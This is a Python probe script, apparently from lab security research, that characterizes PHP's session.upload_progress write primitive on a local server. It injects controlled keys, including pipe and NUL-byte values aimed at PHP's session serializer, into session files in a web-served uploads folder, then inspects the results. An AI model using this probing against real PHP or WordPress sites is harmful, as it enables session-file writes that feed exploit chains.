#!/usr/bin/env python3
"""Characterize PHP's stock session.upload_progress write primitive.

Usage: probe_up.py MODE SID OUTDIR
MODE: size:<keylen>[:<namelen>] | keyhex:<hex> | pipe | nul
Sends a multipart POST to /diag_params.php with PHP_SESSION_UPLOAD_PROGRESS
and optionally one uploaded file, then records the session file state.
"""
import http.client, sys, os, json, time, hashlib, random, string

PORT = 28893
WWW = '/tmp/opencode/research/realchain_20261022T015900Z/www'
SESSDIR = WWW + '/wp-content/uploads/sessions'
PATH = os.environ.get('UP_PATH', '/diag_params.php')


def worker():
    p = subprocess_pid()
    return p


def subprocess_pid():
    import subprocess
    out = subprocess.run(['pgrep', '-P', '958304'], capture_output=True, text=True)
    return out.stdout.split()


def st(sess):
    try:
        s = os.stat(sess)
        d = open(sess, 'rb').read()
        return {'exists': True, 'size': s.st_size, 'mode': oct(s.st_mode & 0o777),
                'sha256': hashlib.sha256(d).hexdigest()}
    except FileNotFoundError:
        return {'exists': False}


def http_get(sid):
    import http.client
    c = http.client.HTTPConnection('127.0.0.1', PORT, timeout=30)
    c.request('GET', '/wp-content/uploads/sessions/sess_' + sid)
    r = c.getresponse()
    d = r.read()
    c.close()
    return {'status': r.status, 'len': len(d), 'head': d[:64].decode('latin1', 'replace')}


def main():
    mode = sys.argv[1]
    sid = sys.argv[2]
    outdir = sys.argv[3]
    key = b'K' * 16
    fname = b'N' * 16
    file_data = b'x'
    do_file = True
    if mode.startswith('size:'):
        parts = mode.split(':')
        key = b'K' * int(parts[1])
        if len(parts) > 2:
            fname = b'N' * int(parts[2])
            file_data = b'y' * 4
    elif mode.startswith('keyhex:'):
        key = bytes.fromhex(mode.split(':', 1)[1])
    elif mode == 'pipe':
        key = b'AAA|BBB'
    elif mode == 'nul':
        key = b'AAA\x00BBB\x00CCC'
    elif mode == 'nofile':
        do_file = False
    else:
        raise SystemExit('bad mode')

    sess = os.path.join(SESSDIR, 'sess_' + sid)
    out = {'mode': mode, 'sid': sid, 'keylen': len(key), 'namelen': len(fname),
           'before': st(sess), 'workers_before': worker()}

    b = '----up' + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
    body = bytearray()

    def part(name, data, filename=None, ctype=None):
        body.extend(('--' + b + '\r\n').encode())
        if filename is None:
            body.extend(('Content-Disposition: form-data; name="%s"\r\n\r\n' % name).encode())
        else:
            body.extend(('Content-Disposition: form-data; name="%s"; filename="%s"\r\n' % (name, filename)).encode())
            if ctype:
                body.extend(('Content-Type: %s\r\n' % ctype).encode())
            body.extend(b'\r\n')
        body.extend(data)
        body.extend(b'\r\n')

    part('PHP_SESSION_UPLOAD_PROGRESS', key)
    if do_file:
        part('f', file_data, filename=fname.decode('latin1'), ctype='application/octet-stream')
    body.extend(('--' + b + '--\r\n').encode())

    out['body_len'] = len(body)
    h = {'Content-Type': 'multipart/form-data; boundary=' + b,
         'Content-Length': str(len(body)), 'Cookie': 'PHPSESSID=' + sid}
    c = http.client.HTTPConnection('127.0.0.1', PORT, timeout=180)
    t = time.time()
    c.request('POST', PATH, bytes(body), h)
    r = c.getresponse()
    data = r.read()
    c.close()
    out['http'] = {'status': r.status, 'resp_len': len(data), 'time': round(time.time() - t, 3),
                   'head': data[:120].decode('latin1', 'replace')}
    out['after'] = st(sess)
    out['http_get'] = http_get(sid)
    out['workers_after'] = worker()

    # structural analysis of the file
    analysis = {}
    try:
        d = open(sess, 'rb').read()
        analysis['file_size'] = len(d)
        analysis['head_repr'] = repr(d[:220])
        # php serializer: name up to first '|', value after
        p = d.find(b'|')
        analysis['name_len'] = p
        analysis['name_head'] = d[:p][:80].decode('latin1', 'replace')
        # prefix
        pref = b'upload_progress_'
        if d.startswith(pref):
            ko = len(pref)
            analysis['key_off'] = ko
            analysis['key_contiguous'] = d[ko:ko + len(key)] == key if len(key) else None
            analysis['key_first_diff'] = next((i for i in range(min(len(key), len(d) - ko)) if d[ko + i] != key[i]), None)
        # value structure
        if p >= 0:
            val = d[p + 1:]
            analysis['value_head'] = repr(val[:300])
            analysis['value_tail'] = repr(val[-220:])
            analysis['pipe_count'] = d.count(b'|')
    except FileNotFoundError:
        analysis['exists'] = False
    out['analysis'] = analysis
    os.makedirs(outdir, exist_ok=True)
    with open(os.path.join(outdir, sid + '.json'), 'w') as f:
        json.dump(out, f, indent=1)
    print(json.dumps(out, indent=1))


if __name__ == '__main__':
    main()
